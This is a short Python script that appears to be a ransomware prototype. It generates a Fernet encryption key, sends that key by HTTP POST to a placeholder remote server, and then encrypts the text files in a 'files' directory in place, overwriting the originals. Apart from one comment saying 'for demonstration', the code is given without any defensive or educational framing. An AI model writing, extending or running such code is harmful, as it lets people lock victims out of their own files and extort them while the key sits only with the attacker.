import os
import requests
from cryptography.fernet import Fernet

# Server URL to send the key to
SERVER_URL = "http://<your-server-ip>:5000/receive_key"
CLIENT_ID = "unique_client_identifier"

# Generate a key for encryption
key = Fernet.generate_key()
cipher = Fernet(key)

# Send the key to the server
def send_key_to_server(key, client_id):
    data = {
        "key": key.decode(),
        "client_id": client_id
    }
    try:
        response = requests.post(SERVER_URL, json=data)
        if response.status_code == 200:
            print("Key sent successfully")
        else:
            print("Failed to send key")
    except Exception as e:
        print(f"Error sending key: {e}")

# Encrypt files in a directory
def encrypt_files(directory, cipher):
    for filename in os.listdir(directory):
        if filename.endswith('.txt'):  # Encrypt only text files for demonstration
            filepath = os.path.join(directory, filename)
            with open(filepath, 'r') as file:
                data = file.read().encode()
            encrypted_data = cipher.encrypt(data)
            with open(filepath, 'wb') as file:
                file.write(encrypted_data)

# Send the encryption key to the server
send_key_to_server(key, CLIENT_ID)

# Encrypt files in the 'files' directory
encrypt_files('files', cipher)
